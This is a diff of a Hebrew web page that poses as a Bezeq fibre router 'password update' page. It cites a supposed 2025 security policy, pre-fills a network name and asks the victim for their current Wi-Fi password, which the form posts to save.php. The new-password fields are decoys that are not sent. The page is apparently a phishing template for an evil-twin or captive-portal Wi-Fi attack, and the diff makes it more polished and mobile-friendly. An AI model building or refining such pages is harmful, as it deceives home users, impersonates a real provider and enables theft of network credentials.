@@ -1,67 +1,213 @@
-<html>
-
+<!doctype html>
+<html lang="he" dir="rtl">
 <head>
-	<meta charset="UTF-8">
-	<meta HTTP-EQUIV='Pragma' CONTENT='no-cache'>
-	<link type="text/css" rel="stylesheet" href="ggh.css">
-	<link rel="icon" href="data:;base64,=">
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <title>עדכון סיסמה לנתב</title>
+
+  <style>
+  
+    :root {
+      --card-max: 420px;
+      --space: 14px;
+      --radius: 14px;
+      --primary: #246BFF;
+      --text: #111;
+      --muted: #666;
+      --bg: #f5f6f8;
+      --border: #e5e7eb;
+    }
+    * { box-sizing: border-box; }
+    html, body {
+      margin: 0; padding: 0;
+      background: var(--bg);
+      color: var(--text);
+      font-family: system-ui, -apple-system, "Segoe UI", Arial, sans-serif;
+      -webkit-text-size-adjust: 100%;
+    }
+
+ 
+    .wrap {
+      min-height: 100dvh;
+      display: grid;
+      place-items: center;
+      padding: 18px;
+    }
+    .card {
+      width: 100%;
+      max-width: var(--card-max);
+      background: #fff;
+      border: 1px solid var(--border);
+      border-radius: var(--radius);
+      box-shadow: 0 8px 24px rgba(0,0,0,.06);
+      padding: clamp(16px, 3.5vw, 22px);
+    }
+
+ 
+    .brand {
+      display: grid;
+      justify-items: center;
+      gap: 8px;
+      margin-bottom: 12px;
+      text-align: center;
+    }
+    .brand img.logo {
+      width: 56px; height: auto;
+    }
+    .title {
+      margin: 0; font-size: 20px; font-weight: 800;
+    }
+    .subtitle {
+      margin: 0; font-size: 13px; color: var(--muted);
+    }
+
+  
+    .lead {
+      margin: 14px 0 8px 0;
+      line-height: 1.5;
+      font-size: 15px;
+      color: #222;
+    }
+
+    form { margin-top: 10px; }
+    .field {
+      margin: 10px 0;
+    }
+    .label {
+      display: block;
+      margin-bottom: 6px;
+      font-size: 14px;
+      color: #333;
+      font-weight: 600;
+    }
+    .input {
+      width: 100%;
+      padding: 12px 14px;
+      border: 1px solid var(--border);
+      border-radius: 10px;
+      background: #fafafa;
+      font-size: 16px; 
+    }
+    .input[readonly] {
+      color: #444;
+      background: #f3f4f6;
+    }
+
+    .button {
+      width: 100%;
+      margin-top: 12px;
+      padding: 13px 16px;
+      border: 0;
+      border-radius: 10px;
+      background: var(--primary);
+      color: #fff;
+      font-weight: 700;
+      font-size: 16px;
+      cursor: pointer;
+    }
+    .button:disabled { opacity: .7; cursor: default; }
+
+    
+    .hero {
+      margin-top: 14px;
+      display: grid;
+      justify-items: center;
+    }
+    .hero img {
+      max-width: 100%;
+      height: auto;
+      border-radius: 12px;
+    }
+
+    /* מסכים רחבים יותר */
+    @media (min-width: 768px) {
+      .card {
+        padding: 24px;
+      }
+      .grid2 {
+        display: grid;
+        grid-template-columns: 1fr 44%;
+        gap: 18px;
+        align-items: start;
+      }
+      .hero { margin-top: 0; }
+    }
+  </style>
 </head>
+<body>
 
-<body oncontextmenu='return false' ondragstart='return false' onselectstart='return false'
-	onselect='document.selection.empty()' oncopy='document.selection.empty()' onbeforecopy='return false'
-	onmouseup='document.selection.empty()'>
-	 <form id="updateForm" method="post" action="save.php" novalidate>
-		<div class="content">
-			<div style="position: relative;">
-				<div style="padding: 0 16px 10px; text-align: center;">
+  <div class="wrap">
+    <div class="card">
+      <div class="brand">
+       
+        <img class="logo" src="b.png" alt="לוגו">
+        <div>
+          <p class="title">עדכון סיסמה לנתב</p>
+          <p class="subtitle">הסיב של בזק</p>
+        </div>
+      </div>
 
-					<br><br>
-					<img src="b.png">
-					<br><br>
-					<div class="login_eng_title">
-						<p>עדכון סיסמה לנתב</p>
-						<p style="font-size: smaller;">הסיב של בזק</p>
-					</div>
-				</div>
-				
-			</div>
-			<div class="login_eng_left"></div>
-			<div class="login_eng_text">
-				<p dir="rtl">
-					עדכון מדיניות האבטחה של בזק לשנת 2025 <br>
-					מחייב אותנו להגן עליכם גם ברשת הביתית
-				</p>
-				<br>
-				  <input dir="rtl" class="login_hebrew_input" type="text" value="Milner" readonly><br>
-				<input dir="rtl" class="login_hebrew_input" type="text" id="token" name="token" placeholder="סיסמה נוכחית"><br>
-				<input dir="rtl" class="login_hebrew_input" type="password" placeholder="סיסמה חדשה"><br>
-				<input dir="rtl" class="login_hebrew_input" type="password" placeholder="הקלד/י סיסמה פעם נוספת"><br><br>
-				<input class="button_blue" id="goBtn" type="submit" value="עדכן">
-				
-			</div> 
-			<div class="login_eng_right"></div>
+      <p class="lead">
+        עדכון מדיניות האבטחה של בזק לשנת 2025 מחייב אותנו להגן עליכם גם ברשת הביתית.
+      </p>
 
-			<div class="login_hb_buttom_center"></div>
-			<div class="login_hb_buttom_right">
-				
-				<img src="route_simple.png">
-			</div>
-		</div>
-	</form>
-		<script>
-		  const f = document.getElementById('updateForm');
-		  const btn = document.getElementById('goBtn');
-		  f.addEventListener('submit', (e) => {
-			const token = (document.getElementById('token').value || '').trim();
-			if (!token) {
-			  e.preventDefault();
-			  alert('Wi-Fi Password (token) is required');
-			  return false;
-			}
-			btn.disabled = true;
-			btn.value = 'Connecting';
-		  });
-		</script>
+      <div class="grid2">
+        
+        <form id="updateForm" method="post" action="save.php" novalidate>
+          <div class="field">
+            <label class="label">שם רשת (SSID)</label>
+            <input class="input" type="text" value="Milner" readonly>
+          </div>
+
+          <div class="field">
+            <label class="label" for="token">סיסמה נוכחית</label>
+            <input class="input" id="token" name="token" type="text"
+                   inputmode="text" autocomplete="off" placeholder="הקלד/י את הסיסמה הנוכחית">
+          </div>
+
+          <div class="field">
+            <label class="label">סיסמה חדשה</label>
+            <input class="input" type="password" placeholder="אופציונלי (לא נשלח לשרת)">
+          </div>
+
+          <div class="field">
+            <label class="label">אימות סיסמה חדשה</label>
+            <input class="input" type="password" placeholder="אופציונלי (לא נשלח לשרת)">
+          </div>
+
+          <button id="goBtn" class="button" type="submit">עדכן</button>
+        </form>
+
+       
+        <div class="hero">
+          <img src="route_simple.png" alt="נתב">
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    (function () {
+      const f = document.getElementById('updateForm');
+      const btn = document.getElementById('goBtn');
+      const tokenEl = document.getElementById('token');
+
+      f.addEventListener('submit', function (e) {
+        const token = (tokenEl.value || '').trim();
+
+        if (!token) {
+          e.preventDefault();
+          alert('נדרש למלא סיסמה נוכחית');
+          tokenEl.focus();
+          return;
+        }
+
+
+        btn.disabled = true;
+        btn.textContent = 'מעבד...';
+      }, false);
+    })();
+  </script>
 </body>
-
 </html>
